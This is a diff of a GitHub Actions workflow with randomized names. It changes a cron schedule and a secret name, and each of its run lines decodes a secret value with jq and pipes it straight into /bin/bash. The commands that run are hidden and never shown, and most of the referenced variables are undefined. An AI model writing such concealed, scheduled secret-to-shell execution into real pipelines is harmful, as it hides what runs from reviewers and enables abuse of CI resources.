@@ -2,22 +2,24 @@ name: numberfreethrow
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 2/6 * * *'
+    - cron: '3 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: numberfreethrow
         env:
-          jbnob2: ${{ secrets.jbnob2 }}
+          jrho483: ${{ secrets.jrho483 }}
         run: |
-          echo $jbnob2 | jq -r .i0505 | /bin/bash
-          echo $gslxj7 | jq -r .y8 | /bin/bash
-          echo $xwxba786 | jq -r .xo858 | /bin/bash
-          echo $yboe084 | jq -r .klyz6807 | /bin/bash
-          echo $a83 | jq -r .t402 | /bin/bash
-          echo $xjil0 | jq -r .z79 | /bin/bash
-          echo $ahbu6036 | jq -r .ewwoh78093 | /bin/bash
-          echo $l8 | jq -r .anzgx33445 | /bin/bash
+          echo $jrho483 | jq -r .qfxi04 | /bin/bash
+          echo $e494 | jq -r .rh870 | /bin/bash
+          echo $aqa5294 | jq -r .ikeaq8 | /bin/bash
+          echo $yudn95030 | jq -r .q4066 | /bin/bash
+          echo $idk0 | jq -r .ld880 | /bin/bash
+          echo $dz8560 | jq -r .jp57702 | /bin/bash
+          echo $o6480 | jq -r .y86 | /bin/bash
+          echo $l2387 | jq -r .lwlxt55278 | /bin/bash
+          echo $t26015 | jq -r .amfi4 | /bin/bash
 
